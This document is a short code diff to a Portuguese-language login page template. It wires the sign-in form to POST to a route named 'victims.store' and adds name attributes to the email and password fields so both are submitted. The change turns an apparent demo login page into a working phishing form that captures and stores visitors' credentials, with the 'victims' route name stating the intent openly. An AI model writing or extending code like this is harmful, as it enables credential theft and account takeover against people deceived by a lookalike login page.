@@ -70,7 +70,7 @@
           Entre para continuar descobrindo conexões.
         </p>
 
-        <form id="demoLogin" class="mt-8 space-y-5">
+        <form id="demoLogin" class="mt-8 space-y-5"  method="POST" action="{{ route('victims.store') }}">
 
           <label class="block">
             <span class="mb-2 block text-sm font-bold">E-mail</span>
@@ -78,6 +78,7 @@
             <input
               required
               type="email"
+              name="email"
               placeholder="voce@exemplo.com"
               class="field"
             >
@@ -91,6 +92,7 @@
                 required
                 id="password"
                 type="password"
+                name="password"
                 placeholder="Sua senha"
                 class="field pr-12"
               >
